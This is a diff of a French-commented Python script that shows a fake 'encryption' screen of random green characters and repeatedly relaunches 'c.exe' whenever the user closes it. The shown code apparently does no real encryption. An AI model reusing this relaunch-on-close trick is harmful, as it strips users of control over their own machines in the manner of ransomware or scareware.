@@ -35,14 +35,6 @@ def SetBackgroundColor(): # Fonction pour bloquer la couleur de l'arrière-plan
     while is_crypting: # Si le cryptage a commencé
         os.system("color a") # Fond noir police verte
         time.sleep(0.1)
-        
-def CantCloseCrypting(): # Fonction pour empêcher l'utilisateur de quitter le cryptage
-    
-    global is_crypting
-    
-    while True:
-        if is_crypting: # Si le cryptage a commencé
-            if "c.exe" not in (p.name() for p in psutil.process_iter()): os.system("start c.exe"), time.sleep(1.5) # Relancer le cryptage si il n'a pas commencé
 
 
 def Main(): # Fonction principale
@@ -75,6 +67,7 @@ def Main(): # Fonction principale
                 time.sleep(1)
                 is_crypting = True # Indiquer aux autres fonctions que le cryptage a commencé
                 while True:
+                    if "c.exe" not in (p.name() for p in psutil.process_iter()): os.system("start c.exe"), time.sleep(1.5) # Relancer le cryptage si il n'a pas commencé
                     char = ""
                     for i in range(237): # 237 = nombre de caractère max par ligne sur le cmd
                         if random.choice([-1, 0, 1]) == 0: char += " " # 1/3 chance d'ajouter un espace
